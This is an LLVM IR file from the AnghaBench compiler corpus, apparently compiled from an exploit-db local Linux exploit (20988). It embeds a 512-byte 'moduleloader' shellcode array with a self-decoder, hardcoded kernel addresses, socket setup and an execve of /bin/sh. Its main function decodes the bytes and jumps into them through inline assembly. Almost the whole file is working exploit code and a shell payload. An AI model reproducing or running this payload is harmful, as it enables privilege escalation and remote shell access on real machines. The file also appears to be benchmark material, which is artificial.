; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20988.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20988.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.moduleloader = private unnamed_addr constant [512 x i8] c"1\C9\E3\02\E3\05\E8\F9\FF\FF\FFX\83\E8\0B\89\C61\C9A\D0\E1\D0\E1\D0\E1\D0\E1\D0\E1\D0\E1\01\CEf\B9\C0\01\FE\0E\FE\0E\FE\0EFI\E3\05\E9\F1\FF\FF\FF\90\90\90\90\90\90\90\90\90\90\90\E8\00\00\00\00[\83\EB\05\B8\7F\00\00\00\81\C3`\00\00\00\83\C3H\B9\00\01\00\00\CD\80\89\C2\83\EBH\C7C\00H\00\00\00\C7C\0C\00\01\00\00\83\C2H\89S\08\83\C2\08\89S,\B8\80\00\00\00\83\C3H\89\D9\83\E9H\CD\801\C9\0F\83\CC\00\00\00\90\90\90\90\90\90\90\90\90\90\90\90\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00jpabel\00\00\E8\00\00\00\00X\83\E8\05\89\C1\83\C1`\BAl\94%\C0\89\0A\83\C1\04\BAd\94%\C0\89\0A\BAp\94%\C0\89\0A\83\C1\01\BAP\94%\C0\89\0A\BA\\\94%\C0\89\0A\BAt\94%\C0\89\0A\BAx\94%\C0\89\0A\BA|\94%\C0\89\0A\B8\00\00\00\00\C3\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\B8\00\00\00\00\C3\90\90\90\901\C0\EB|Y\89A\10\89A\08\FE\C0\89A\04\89\C3@\89\01\B0f\CD\80\B3\02\89Y\0C\C6A\0E\99\C6A\08\10\89I\04\80A\04\0C\88\01\B0f\CD\80\B3\04\B0f\CD\80\B3\05\89I\04\89I\08\B0f\CD\80\89\CE\88\C31\C9\B0?\CD\80\FE\C1\B0?\CD\80\FE\C1\B0?\CD\80\C7\06/bin\C7F\04/shA0\C0\88F\07\89v\0C\8DV\10\8DN\0C\89\F3\B0\0B\CD\80\B0\01\CD\80\E8\7F\FF\FF\FF\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90", align 16

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [512 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %9 = bitcast [512 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %9, i8* align 16 getelementptr inbounds ([512 x i8], [512 x i8]* @__const.main.moduleloader, i32 0, i32 0), i64 512, i1 false)
  store i32 64, i32* %8, align 4
  br label %10

10:                                               ; preds = %24, %2
  %11 = load i32, i32* %8, align 4
  %12 = icmp slt i32 %11, 512
  br i1 %12, label %13, label %27

13:                                               ; preds = %10
  %14 = load i32, i32* %8, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = add nsw i32 %18, 3
  %20 = trunc i32 %19 to i8
  %21 = load i32, i32* %8, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %22
  store i8 %20, i8* %23, align 1
  br label %24

24:                                               ; preds = %13
  %25 = load i32, i32* %8, align 4
  %26 = add nsw i32 %25, 1
  store i32 %26, i32* %8, align 4
  br label %10

27:                                               ; preds = %10
  %28 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 0
  store i8* %28, i8** %7, align 8
  call void asm sideeffect "movl %ebp, %eax", "~{dirflag},~{fpsr},~{flags}"() #2, !srcloc !2
  call void asm sideeffect "subl $$520, %eax", "~{dirflag},~{fpsr},~{flags}"() #2, !srcloc !3
  call void asm sideeffect "pushl %eax", "~{dirflag},~{fpsr},~{flags}"() #2, !srcloc !4
  call void asm sideeffect "ret", "~{dirflag},~{fpsr},~{flags}"() #2, !srcloc !5
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { nounwind }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{i32 3641}
!3 = !{i32 3675}
!4 = !{i32 3709}
!5 = !{i32 3738}
